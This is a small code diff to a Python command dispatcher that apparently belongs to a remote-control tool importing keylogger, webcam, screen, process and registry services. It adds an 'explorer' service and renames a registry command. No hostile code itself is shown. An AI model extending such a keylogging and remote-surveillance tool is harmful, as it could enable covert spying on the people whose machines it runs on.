@@ -2,7 +2,7 @@ import shlex
 import constants
 import utils
 
-from services import app, help, keylogger, mac, pc, process, registry, screen, webcam
+from services import app, help, keylogger, mac, pc, process, registry, screen, webcam, explorer
 from GlobalVariables import configs
 
 request_tree = {
@@ -42,7 +42,7 @@ request_tree = {
         },
         'registry': {
             'get': [1, registry.get],
-            'add': [3, registry.new_key],
+            'add_subkey': [3, registry.add_subkey],
             'modify': [3, registry.modify_key],
             'delete': [1, registry.delete_key],
             'clear': [1, registry.clear_value]
